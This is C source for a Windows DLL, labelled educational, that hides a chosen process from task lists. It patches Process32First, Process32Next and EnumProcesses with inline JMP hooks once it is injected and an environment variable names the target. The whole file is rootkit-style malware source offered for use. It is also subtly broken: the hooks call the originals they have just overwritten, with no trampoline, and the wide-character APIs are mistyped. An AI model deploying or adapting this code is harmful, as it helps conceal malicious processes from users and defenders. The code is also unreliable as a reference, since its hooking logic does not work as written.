/**
 * Windows Process Hiding Tool - EDUCATIONAL PURPOSE ONLY
 * 
 * This DLL hooks Windows API functions to hide specific processes.
 * 64-bit compatible version for Windows 10/11.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>

// Target process name to hide
char TARGET_PROCESS[MAX_PATH] = {0};

// Function pointer types for the functions we'll hook
typedef BOOL (WINAPI *PROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *PROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *ENUMPROCESSES)(DWORD*, DWORD, LPDWORD);

// Original function pointers
PROCESS32NEXT OriginalProcess32Next = NULL;
PROCESS32FIRST OriginalProcess32First = NULL;
ENUMPROCESSES OriginalEnumProcesses = NULL;

// Get the process ID from a name
DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    
    // Create a snapshot of all processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    // Initialize the size of the structure
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    // Get the first process
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    
    // Check each process
    do {
        // Check if it's our target
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));
    
    // Clean up
    CloseHandle(hSnapshot);
    
    return pid;
}

// Hooked Process32Next function
BOOL WINAPI HookedProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    BOOL result;
    
    // Call original function
    result = OriginalProcess32Next(hSnapshot, lppe);
    
    // If successful, check if it's our target process
    if (result && TARGET_PROCESS[0] != '\0') {
        if (_stricmp(lppe->szExeFile, TARGET_PROCESS) == 0) {
            // Skip this process by calling original again
            return OriginalProcess32Next(hSnapshot, lppe);
        }
    }
    
    return result;
}

// Hooked Process32First function
BOOL WINAPI HookedProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    BOOL result;
    
    // Call original function
    result = OriginalProcess32First(hSnapshot, lppe);
    
    // If successful, check if it's our target process
    if (result && TARGET_PROCESS[0] != '\0') {
        if (_stricmp(lppe->szExeFile, TARGET_PROCESS) == 0) {
            // Skip this process by calling original again
            return OriginalProcess32Next(hSnapshot, lppe);
        }
    }
    
    return result;
}

// Hooked EnumProcesses function
BOOL WINAPI HookedEnumProcesses(DWORD* pProcessIds, DWORD cb, LPDWORD pBytesReturned) {
    BOOL result;
    DWORD targetPid;
    
    // Call original function
    result = OriginalEnumProcesses(pProcessIds, cb, pBytesReturned);
    
    // If successful and we have a target, filter it out
    if (result && TARGET_PROCESS[0] != '\0') {
        targetPid = GetProcessIdByName(TARGET_PROCESS);
        
        if (targetPid != 0) {
            DWORD count = *pBytesReturned / sizeof(DWORD);
            DWORD newCount = 0;
            
            // Filter out the target process
            for (DWORD i = 0; i < count; i++) {
                if (pProcessIds[i] != targetPid) {
                    pProcessIds[newCount++] = pProcessIds[i];
                }
            }
            
            // Update bytes returned
            *pBytesReturned = newCount * sizeof(DWORD);
        }
    }
    
    return result;
}

// Set up function hooks
BOOL SetupHooks() {
    HMODULE hKernel32;
    HMODULE hPsapi;
    DWORD oldProtect;
    BOOL result = TRUE;
    
    // Get module handles
    hKernel32 = GetModuleHandleA("kernel32.dll");
    hPsapi = GetModuleHandleA("psapi.dll");
    
    if (!hKernel32 || !hPsapi) {
        return FALSE;
    }
    
    // Get addresses of original functions
    OriginalProcess32Next = (PROCESS32NEXT)GetProcAddress(hKernel32, "Process32NextW");
    OriginalProcess32First = (PROCESS32FIRST)GetProcAddress(hKernel32, "Process32FirstW");
    OriginalEnumProcesses = (ENUMPROCESSES)GetProcAddress(hPsapi, "EnumProcesses");
    
    if (!OriginalProcess32Next || !OriginalProcess32First || !OriginalEnumProcesses) {
        return FALSE;
    }
    
    // Hook Process32Next
    if (VirtualProtect(OriginalProcess32Next, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        // Write JMP instruction
        *(BYTE*)OriginalProcess32Next = 0xE9;  // JMP
        *(DWORD*)((BYTE*)OriginalProcess32Next + 1) = (DWORD)((DWORD_PTR)HookedProcess32Next - (DWORD_PTR)OriginalProcess32Next - 5);
        
        // Restore protection
        VirtualProtect(OriginalProcess32Next, 5, oldProtect, &oldProtect);
    } else {
        result = FALSE;
    }
    
    // Hook Process32First
    if (VirtualProtect(OriginalProcess32First, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        // Write JMP instruction
        *(BYTE*)OriginalProcess32First = 0xE9;  // JMP
        *(DWORD*)((BYTE*)OriginalProcess32First + 1) = (DWORD)((DWORD_PTR)HookedProcess32First - (DWORD_PTR)OriginalProcess32First - 5);
        
        // Restore protection
        VirtualProtect(OriginalProcess32First, 5, oldProtect, &oldProtect);
    } else {
        result = FALSE;
    }
    
    // Hook EnumProcesses
    if (VirtualProtect(OriginalEnumProcesses, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        // Write JMP instruction
        *(BYTE*)OriginalEnumProcesses = 0xE9;  // JMP
        *(DWORD*)((BYTE*)OriginalEnumProcesses + 1) = (DWORD)((DWORD_PTR)HookedEnumProcesses - (DWORD_PTR)OriginalEnumProcesses - 5);
        
        // Restore protection
        VirtualProtect(OriginalEnumProcesses, 5, oldProtect, &oldProtect);
    } else {
        result = FALSE;
    }
    
    return result;
}

// DLL entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    char processName[MAX_PATH];
    
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Get target process from environment variable
            if (GetEnvironmentVariableA("TARGET_PROCESS", processName, MAX_PATH)) {
                strncpy_s(TARGET_PROCESS, MAX_PATH, processName, _TRUNCATE);
                SetupHooks();
            }
            break;
            
        case DLL_PROCESS_DETACH:
            // Cleanup if needed
            break;
    }
    
    return TRUE;
}
